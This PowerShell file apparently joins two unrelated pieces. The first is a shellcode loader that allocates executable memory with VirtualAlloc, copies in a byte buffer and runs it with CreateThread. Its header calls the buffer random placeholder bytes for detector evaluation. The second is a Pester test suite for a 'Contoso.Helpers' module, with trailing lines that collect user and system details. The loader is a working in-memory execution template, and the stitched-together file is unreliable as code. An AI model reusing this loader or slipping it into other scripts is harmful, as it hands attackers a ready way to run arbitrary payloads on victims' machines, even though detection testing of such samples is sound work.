
<#
.SYNOPSIS
    Loads a prepared binary buffer into committed memory and starts it
    on a worker thread.

.DESCRIPTION
    Allocates RWX memory with VirtualAlloc, copies the prepared buffer
    into it, starts a thread and waits for completion. The buffer is a
    placeholder supplied for static-analysis exercises.

.NOTES
    Sample generated for detector evaluation. No real payload is used.
#>

$LogPath = "$env:TEMP\stage.log"

$NativeCode = @"
using System;
using System.Runtime.InteropServices;

public static class MemoryApi
{
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize,
        uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool VirtualFree(IntPtr lpAddress, uint dwSize,
        uint dwFreeType);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes,
        uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr hObject);
}
"@

Add-Type -TypeDefinition $NativeCode -Language CSharp

# buffer placeholder: random bytes, replaces the encrypted stage in real samples
$Buffer = [Byte[]] @(
    0x6a, 0xa3, 0xc9, 0xb2, 0x98, 0x77, 0x22, 0x7e, 0x97, 0xf1, 0x0b, 0x4f, 0x46, 0x2f, 0x24, 0xb3,
    0xe8, 0xbc, 0x05, 0xb0, 0x80, 0xd6, 0xd4, 0x1b, 0xf2, 0xed, 0x7f, 0xe6, 0x28, 0x66, 0x52, 0xd1,
    0x4b, 0xf2, 0xab, 0x29, 0xb5, 0x36, 0x36, 0xb3, 0x0e, 0xc2, 0xfc, 0x1b, 0xa7, 0x95, 0x89, 0xf3,
    0x17, 0x7b, 0xf5, 0x67, 0x21, 0x25, 0xdd, 0xad, 0xbf, 0xdc, 0xbd, 0x90, 0x84, 0xd8, 0xa8, 0x21,
    0x7d, 0x84, 0x25, 0x34, 0x69, 0x09, 0x4a, 0x01, 0xa6, 0xa2, 0xc2, 0xa2, 0x63, 0x48, 0x5b, 0x28,
    0xd6, 0x7b, 0x8f, 0xd8, 0x6e, 0xad, 0x4e, 0x79, 0xc0, 0x14, 0x73, 0x7e, 0x56, 0x7b, 0xf9, 0xf6,
    0x69, 0x0a, 0x5b, 0x5b, 0x75, 0x45, 0x3c, 0x10, 0xb3, 0xc1, 0xc6, 0x1a, 0xa5, 0xce, 0xfe, 0xf7,
    0x2e, 0xdd, 0x8f, 0x2f, 0x86, 0xe1, 0x9e, 0x14, 0x74, 0xfd, 0x8d, 0x94, 0x94, 0xe2, 0x12, 0x64,
    0x63, 0xea, 0x98, 0x52, 0x02, 0x0c, 0x04, 0xd5, 0x77, 0x45, 0x69, 0x4b, 0x38, 0xe2, 0xf6, 0x57,
    0x74, 0xeb, 0x74, 0xc8, 0xd7, 0x13, 0xd9, 0x67, 0xda, 0x6a, 0xf3, 0xa2, 0xfc, 0x7e, 0x02, 0xb5,
    0x2f, 0x67, 0x9b, 0x1a, 0xde, 0x46, 0x7e, 0xd4, 0x67, 0x82, 0x93, 0x81, 0x9c, 0xa7, 0xee, 0x0b,
    0xdc, 0x22, 0x3d, 0xd2, 0xa6, 0x8a, 0x90, 0x23, 0x18, 0x92, 0x34, 0xec, 0x2e, 0x4f, 0xd4, 0x6d,
    0x5a, 0x2a, 0x58, 0x33, 0x1c, 0x0a, 0x88, 0x60, 0x79, 0x7c, 0x4f, 0x47, 0xc5, 0x94, 0xe1, 0x81,
    0x50, 0x1a, 0x8e, 0xdd, 0x24, 0x94, 0xff, 0x2a, 0x59, 0x5f, 0x0e, 0xd5, 0x86, 0xee, 0x85, 0x7a,
    0xe4, 0x48, 0x9c, 0x3d, 0xe5, 0xb1, 0x82, 0x90, 0x9a, 0xa0, 0x09, 0xb0, 0xab, 0x50, 0x8f, 0x58,
    0x6d, 0xfa, 0xca, 0xdf, 0x27, 0xd9, 0x1b, 0x3f, 0x11, 0xe7, 0x49, 0x98, 0xbe, 0xc3, 0xed, 0xcc,
    0xf9, 0x05, 0xac, 0x20, 0x5f, 0x44, 0xed, 0xfc, 0x75, 0xde, 0xd1, 0xcb, 0xe7, 0xff, 0x21, 0x12,
    0xba, 0x06, 0x23, 0xa0, 0xa8, 0x7e, 0xcb, 0xc7, 0x58, 0x41, 0x27, 0x4c, 0xda, 0xbc, 0x89, 0xd2,
    0x64, 0x99, 0x85, 0x2b, 0xf6, 0x6f, 0xfd, 0x3d, 0x76, 0x74, 0x84, 0x40, 0xcd, 0x94, 0x9b, 0x8a,
    0x4c, 0x47, 0x6e, 0x4c, 0xbc, 0x5a, 0xd7, 0xd6, 0xf7, 0x26, 0x1a, 0xf4, 0x1a, 0x3e, 0x6a, 0x50,
    0x7e, 0xb2, 0xb7, 0xda, 0xbd, 0x8e, 0x8c, 0x0e, 0x22, 0x20, 0x7d, 0xe8, 0x9d, 0xe2, 0x3a
)

$HProcess = [MemoryApi]::VirtualAlloc([IntPtr]::Zero, $Buffer.Length, 0x3000, 0x40)
if ($HProcess -eq [IntPtr]::Zero) {
    Write-Error "VirtualAlloc failed: $([Runtime.InteropServices.Marshal]::GetLastWin32Error())"
    return
}

[Runtime.InteropServices.Marshal]::Copy($Buffer, 0, $HProcess, $Buffer.Length)
$ThreadId = 0
$Thread = [MemoryApi]::CreateThread([IntPtr]::Zero, 0, $HProcess, [IntPtr]::Zero, 0, [ref]$ThreadId)
[void][MemoryApi]::WaitForSingleObject($Thread, 1808)
[void][MemoryApi]::CloseHandle($Thread)

$Report = [ordered]@{ Stage = 'loader'; BufferBytes = $Buffer.Length; ThreadId = $ThreadId }
$Report | ConvertTo-Json -Compress | Out-File -FilePath $LogPath -Append
<#
.SYNOPSIS
    Pester specification for the Contoso.Helpers module.
.EXAMPLE
    Invoke-Pester -Path .\Contoso-Helpers.Tests.ps1 -Output Detailed
.NOTES
    Author: Infra Automation
    Last updated: 2025-10-20
#>


$DebugPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

BeforeAll {
    Import-Module (Join-Path $PSScriptRoot 'Contoso.Helpers.psd1') -Force
    $script:fixturePath = Join-Path $env:TEMP 'agent-fixture.json'
}
Describe 'Get-ServerState' {
    Context 'when the agent service is running' {
        BeforeEach {
            Mock Get-Service {
                [pscustomobject]@{ Name = 'InfraRelay'; Status = 'Running' }
            } -ParameterFilter { $Name -eq 'InfraRelay' }
        }

        It 'reports Running for a healthy agent' {
            $result = Get-ServerState -Name 'InfraRelay'
            $result.Status | Should -Be 'Running'
        }
    }

    It 'throws when the service does not exist' {
        { Get-ServerState -Name 'NoSuchAgent' } | Should -Throw
    }
}

Describe 'Get-AgentConfig' {
    It 'returns the configured port for <Name>' -TestCases @(
        @{ Name = 'InfraRelay'; Expected = 8443 }
        @{ Name = 'SecondaryAgent'; Expected = 8543 }
    ) {
        param($Name, $Expected)
        $config = Get-AgentConfig -Name $Name
        $config.Port | Should -Be $Expected
    }
}

Describe 'Get-ServerState' {
    Context 'with a stopped service' {
        BeforeEach {
            Mock Get-Service {
                [pscustomobject]@{ Name = 'InfraRelay'; Status = 'Stopped' }
            } -ParameterFilter { $Name -eq 'InfraRelay' }
        }

        It 'reports Stopped' {
            (Get-ServerState -Name 'InfraRelay').Status | Should -Be 'Stopped'
        }
    }
}

Describe 'module metadata' {
    It 'exports only public functions' {
        $commands = Get-Command -Module 'Contoso.Helpers' | Select-Object -ExpandProperty Name
        $commands | Should -Contain 'Get-ServerState'
    }
}

Describe 'Get-AgentConfig validation' {
    It 'rejects an empty path' {
        { Get-AgentConfig -Path '' } | Should -Throw
    }

    It 'accepts a path below the temp folder' {
        $path = Join-Path $env:TEMP 'agent.ini'
        { Get-AgentConfig -Path $path } | Should -Not -Throw
    }
}

AfterAll {
    Remove-Module Contoso.Helpers -Force -ErrorAction SilentlyContinue
    Remove-Item -LiteralPath $script:fixturePath -Force -ErrorAction SilentlyContinue
}

Describe 'Get-AgentStatus output shape' {
    It 'returns an object with a Status property' {
        $result = Get-ServerState -Name 'InfraRelay'
        $result.PSObject.Properties.Name | Should -Contain 'Status'
    }
}

Describe 'error handling' {
    It 'does not throw for a missing optional file' {
        { Get-Item -LiteralPath (Join-Path $env:TEMP 'missing-agent.ini') -ErrorAction SilentlyContinue } | Should -Not -Throw
    }
}

Describe 'Get-AgentStatus pipeline input' {
    It 'accepts a server name from the pipeline' {
        { 'InfraRelay' | Get-ServerState } | Should -Not -Throw
    }
}

Describe 'tagging' {
    It 'applies the requested tag' {
        $tag = @{ Environment = 'Test' }
        $tag.Environment | Should -Be 'Test'
    }
}

Describe 'configuration fixture' {
    It 'can be serialised to JSON' {
        $config = [pscustomobject]@{ Name = 'InfraRelay'; Port = 8443 }
        ($config | ConvertTo-Json) | Should -Not -BeNullOrEmpty
    }
}

$psVersion = $PSVersionTable.PSVersion
Write-Verbose ("PowerShell {0}.{1} on {2}" -f $psVersion.Major, $psVersion.Minor, $env:COMPUTERNAME)
Write-Verbose ("Completed at {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss'))

$sessionLog = Join-Path $env:TEMP ("session-" + (Get-Date -Format 'yyyyMMdd') + ".log")
Add-Content -Path $sessionLog -Value ("Run finished {0}" -f (Get-Date -Format 'yyyy-MM-dd HH:mm:ss')) -Encoding UTF8

$isElevated = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
if (-not $isElevated) {
    Write-Warning 'Some checks require an elevated session.'
}

$staleTemp = Get-ChildItem -Path $env:TEMP -Filter 'w3c-*' -Directory -ErrorAction SilentlyContinue |
    Where-Object { $_.LastWriteTime -lt (Get-Date).AddDays(-3) }
foreach ($dir in $staleTemp) {
    Remove-Item -LiteralPath $dir.FullName -Recurse -Force -ErrorAction SilentlyContinue
}

$runningAsService = $env:SESSIONNAME -eq 'Services'
Write-Verbose ("Interactive session: {0}" -f (-not $runningAsService))
Write-Verbose ("Temp folder: {0}" -f [System.IO.Path]::GetTempPath())

$culture = [System.Globalization.CultureInfo]::CurrentCulture
Write-Verbose ("Culture: {0}" -f $culture.Name)
Write-Verbose ("Machine: {0}" -f $env:COMPUTERNAME)

$osVersion = [System.Environment]::OSVersion.VersionString
Write-Verbose ("Operating system: {0}" -f $osVersion)
Write-Verbose ("User: {0}" -f [System.Security.Principal.WindowsIdentity]::GetCurrent().Name)

$logFolder = Join-Path $env:TEMP 'ops-logs'
if (-not (Test-Path -LiteralPath $logFolder)) {
    New-Item -Path $logFolder -ItemType Directory -Force | Out-Null
}
Write-Verbose ("Log folder: {0}" -f $logFolder)

$elapsed = (Get-Date) - (Get-Date).Date
Write-Verbose ("Time since midnight: {0:N1} hours" -f $elapsed.TotalHours)

$powerShellHome = $PSHOME
Write-Verbose ("PowerShell home: {0}" -f $powerShellHome)
